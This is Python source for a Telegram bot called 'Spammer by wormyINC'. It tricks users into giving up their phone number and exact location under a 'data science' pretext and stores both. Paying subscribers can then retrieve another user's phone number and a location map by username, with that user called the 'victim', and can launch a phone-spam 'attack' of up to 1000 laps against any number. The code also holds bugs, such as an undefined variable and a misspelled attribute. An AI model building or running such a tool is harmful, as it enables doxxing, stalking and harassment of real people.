import string
import random
import json
import sqlite3
import folium
import os
import phonenumbers as ph
import telebot as t

from bot_funcs.main_of_da_funcs import atack_function
from telebot import types as ty


with open('config.json') as file:
    config = json.load(file)
phone_number ={}
current_promocode=None
uid_contact={}
got_id = []
ql = {}
uid_bool = {}
al = {}
bot = t.TeleBot(config.get('tk'));path=dicT_.get('path');index = dicT_.get('ip');my_id=dicT_.get('id');url=dicT_.get('url')
@bot.message_handler(commands=['gen_promo'])
def gen_promo(message):
    if message.from_user.id == my_id:bot.delete_message(message_id=message.message_id,chat_id=message.chat.id);global current_promocode;sym = list(string.ascii_letters+string.digits);random.shuffle(sym);current_promocode=''.join(sym[:9]);bot.send_message(chat_id=message.chat.id,text=f'🎟 Current promocode is: `{current_promocode}`', parse_mode='MARKDOWN',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]))
@bot.message_handler(commands=['start'])
def contact(message):
    try:
        if message.from_user.id in got_id:bot.send_message(message.from_user.id,'❌ This message may be sent once.',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]))  
        else: got_id.append(message.from_user.id);contact_keyboard = ty.ReplyKeyboardMarkup(True,True,input_field_placeholder='📱 Waiting for your phone number.').add(ty.KeyboardButton('📱 Give my phone number',request_contact=True));global contact_message;contact_message =bot.send_message(message.chat.id, f'👋 Hello, @{message.from_user.username}!\n\n☝️ To start using this bot please give me your phone number.', reply_markup=contact_keyboard)
    except:pass #if they dont hav un lol ._.
@bot.message_handler(content_types=['contact'])
def location(message):bot.delete_message(message_id=message.message_id, chat_id=message.chat.id);bot.delete_message(message_id=contact_message.message_id,chat_id=message.chat.id);uid_contact.update([(str(message.from_user.id), message.contact.phone_number)]);location_keyboard = ty.ReplyKeyboardMarkup(True,True,input_field_placeholder='📟 Waiting for your geolocation.').add(ty.KeyboardButton('📟 Give my location',request_location=True));global location_message;location_message =bot.send_message(message.chat.id,'👌 Last step. Send your location.\n\n📟 This information may be used by other users only if they have access to functions.\n\n✍️ We need this information for data science.',reply_markup=location_keyboard)
@bot.message_handler(content_types=['location'])
def agreement_and_db_insert(message):
    bot.delete_message(message_id=message.message_id, chat_id=message.chat.id);bot.delete_message(message_id=location_message.message_id,chat_id=message.chat.id);db =sqlite3.connect(f'{path}data.db');cure = db.cursor();db.execute('CREATE TABLE IF NOT EXISTS data(un text,pn text,id integer ,st integer, la text, lo text)');cure.execute("SELECT * FROM data WHERE id =?", [message.from_user.id])
    if cure.fetchone()is None:cure.execute("INSERT INTO data (un,pn,id,st,la,lo)VALUES (?,?,?,?,?,?)", ('@'+message.from_user.username, str(uid_contact.get(str(message.from_user.id))), message.from_user.id, 0, str(message.location.latitude),str(message.location.longitude)));db.commit()
    cure.execute("SELECT * FROM data WHERE id =?", [message.from_user.id]);check = cure.fetchone()
    if message.from_user.id not in uid_bool :uid_bool.update([(check[2], bool(int(check[3])))])
    agreement = ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 Terms of Use',url=url),ty.InlineKeyboardButton(text='✅ Agree',callback_data='main_menu')]]);bot.send_message(message.chat.id, '\t🚨 WARNING 🚨\n\nBy pressing "✅ Agree" button, and using this bot, you confirm that you have read the Terms of Use.', reply_markup=agreement)
@bot.callback_query_handler(func=lambda call:True)
def callback(call):
    if call.data == 'main_menu':global main_keyboard,cancel;bot.clear_step_handler_by_chat_id(call.mesage.chat.id);cancel =ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu')]]);main_keyboard = ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🎯 Spam',callback_data='spam'),ty.InlineKeyboardButton(text='📱 Data by users',callback_data='get_data')],[ty.InlineKeyboardButton(text='🔑 Subscription',callback_data='sub'),]]);bot.answer_callback_query(call.id);bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text='🛎 Spammer by wormyINC is ready to work!',reply_markup=main_keyboard)
    elif call.data == 'spam':
        if uid_bool.get(call.from_user.id):global spam_message;spam_message=bot.edit_message_text(chat_id=call.message.chat.id,message_id= call.message.message_id, text='⏳ Please input your phone number below.\n\n🌀 Example: 79236723802',reply_markup=cancel);bot.register_next_step_handler(spam_message,phone_number_check)
        else:activate_your_promo(call.message)
    elif call.data == 'get_data':
        if uid_bool.get(call.from_user.id):global data_message;data_message=bot.edit_message_text(chat_id=call.message.chat.id,message_id= call.message.message_id, text='⏳ Please input your victim\'s username to we may continue.\n\n🌀 Username must look like this: @AxisModel014',reply_markup=cancel);bot.register_next_step_handler(data_message,data_check)
        else:activate_your_promo(call.message)
    elif call.data == 'del_data':
        try:bot.delete_message(message_id=call.message.message_id, chat_id=call.message.chat.id)
        except:pass #to keep ur terminal clean :3
    elif call.data == 'sub':global after_purchase ; after_purchase = bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id,text='#️⃣ Which option would you like to select?',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🎟 By promocode', callback_data='pay_by_promo'), ty.InlineKeyboardButton(text='⭐️ By telegram stars', callback_data='pay_by_stars')], [ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu')]]))
    elif call.data =='pay_by_stars':bot.answer_callback_query(call.id);bot.send_invoice(call.message.chat.id,title="⭐️ Buy subscription",description="🌀 This subscription will give you access to the main bot funcs!",invoice_payload="flash_мне_в_очко",provider_token="",  currency="XTR",prices=[ty.LabeledPrice(label='⭐️ Purchase for 109.(9) stars',amount=110)], reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='⭐️ Purchase for 101 stars', pay=True),ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]))
    elif call.data == 'pay_by_promo':                                                                                                                                                                                                                                                                                                             # ^ bruh my humor...
        bot.answer_callback_query(call.id)
        if current_promocode is not None:global promo_message;promo_message = bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= '☑️ Insert your promocode below.',reply_markup=cancel);bot.register_next_step_handler(promo_message, promo_input)
        else:bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text= '✖️ There\'s no generated promocodes yet.',reply_markup=cancel)
def activate_your_promo(message):bot.edit_message_text('👀 Looks like you don\'t have a subscription!\n\n☝️ You can find more information in "🔑 Subscription".',message.chat.id, message.message_id,reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
def spam_error(message, error):phone_number.pop(message.from_user.id);bot.edit_message_text(f'❌ Uh-oh, something went wrong!\n\n{error}',chat_id=message.chat.id, message_id=spam_message.message_id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='❌ Cancel option', callback_data='main_menu'),ty.InlineKeyboardButton(text='🔂 Repeat option', callback_data='spam')]]))
def promo_input(message):
    global current_promocode;bot.delete_message(message_id=message.message_id,chat_id=message.chat.id)
    if message.text == current_promocode:db =sqlite3.connect(f'{path}data.db');cure = db.cursor();cure.execute(f"UPDATE data SET st = 1 WHERE id = ?",[message.from_user.id]);db.commit();uid_bool.update([(message.from_user.id, True)]);current_promocode=None;bot.edit_message_text(chat_id=message.chat.id, message_id=promo_message.message_id, text='☑️ Success! Promocode\'s activated!',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]))
    else:bot.edit_message_text(chat_id=message.chat.id, message_id=promo_message.message_id, text='✖️ Promocode not found!',reply_markup=cancel)
def phone_number_check(message):
    phone_number.update([(message.from_user.id , message.text)]);bot.delete_message(message.chat.id,message.message_id)
    try:
        if ph.is_valid_number(ph.parse('+'+phone_number.get(message.from_user.id))) and int(phone_number.get(message.from_user.id)):global laps; laps = bot.edit_message_text("🏁 Great, now input laps value.\n\n🌀 The value must be between 1 and 1000",message_id=spam_message.message_id,chat_id=message.chat.id, reply_markup=cancel);bot.register_next_step_handler(laps,laps_check)
        else:raise(RuntimeError)
    except:spam_error(message, '📲 Incorrect phone number!')
def laps_check(message):
    bot.delete_message(message.chat.id,message.message_id)
    try:
        if int(message.text) >= 1 or int(message.text) <= 1000 and '-' not in message.text:
            with open(f'config.json') as file:is_running = json.load(file)
            if bool(int(is_running.get('atack'))):spam_error(message, '🖍 Try again later, sombody\'s using this function now!')
            else:
                with open(f'config.json', 'r') as file:data_to_insert=json.load(file);data_to_insert['atack'] = 1;change_data(data_to_insert);bot.edit_message_text('✅ Success!\n\n🚀 The attack has already been launched, you may now return to main menu',chat_id=message.chat.id, message_id=spam_message.message_id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]));atack_function(phone_number.get(message.from_user.id), int(message.text));data_to_insert['atack'] = 0;change_data(data_to_insert)
        else:raise(ValueError)
    except ValueError:spam_error(message, '🏁 Incorrect laps value!')
def change_data(data):
    with open(f'config.json', 'w') as f:json.dump(data,f, indent=4)
def data_check(message):
    bot.delete_message(message.chat.id,message.message_id);db =sqlite3.connect(f'{path}data.db');cure = db.cursor();cure.execute("SELECT la,lo,pn FROM data WHERE un =?", [message.text]);data =cure.fetchone()
    if data is not None:
        if not os.path.exists(f'{index}{data[2]}.html'):map_file = folium.Map(location=[data[0], data[1]], zoom_start=9);folium.Marker([data[0],data[1]], popup='Their exatc geo location.').add_to(map_file);map_file.save(f'{index}{data[2]}.html')
        with open(f'{index}{data[2]}.html','rb') as send:bot.edit_message_text('✅ Success! You may now return to main menu.',message_id=data_message.message_id,chat_id=message.chat.id, reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]]));global file_;file_=bot.send_document(chat_id=message.chat.id,document=send,caption=f'☑️ User found! Their phone number:{data[2]}', reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='🗑 Delete message (can be deleted in 2 days)',callback_data='del_data')]]));send.close()
    else:bot.edit_message_text('👀 Looks like this user didn\'t use this bot before.\n\n🌀 Data not found.',message_id=data_message.message_id,chat_id=message.chat.id, reply_markup=cancel)
@bot.pre_checkout_query_handler(func=lambda query: True)
def handle_pre_checkout_query(pre_checkout_query):bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
@bot.message_handler(content_types=['successful_payment'])
def handle_successful_payment(message):db =sqlite3.connect(f'{path}data.db');cure = db.cursor();cure.execute(f"UPDATE data SET st = 1 WHERE id = ?",[message.from_user.id]);db.commit();uid_bool.update([(message.from_user.id, True)]);bot.delete_message(message.chat.id,message.message_id);bot.edit_message_text(chat_id=message.chat.id, message_id=after_purchase.message_id, text='☑️ Success! Promocode\'s activated!',reply_markup=ty.InlineKeyboardMarkup(keyboard=[[ty.InlineKeyboardButton(text='📃 To main menu',callback_data='main_menu')]])) 
if  __name__ == '__main__':bot.infinity_polling(1209600) 
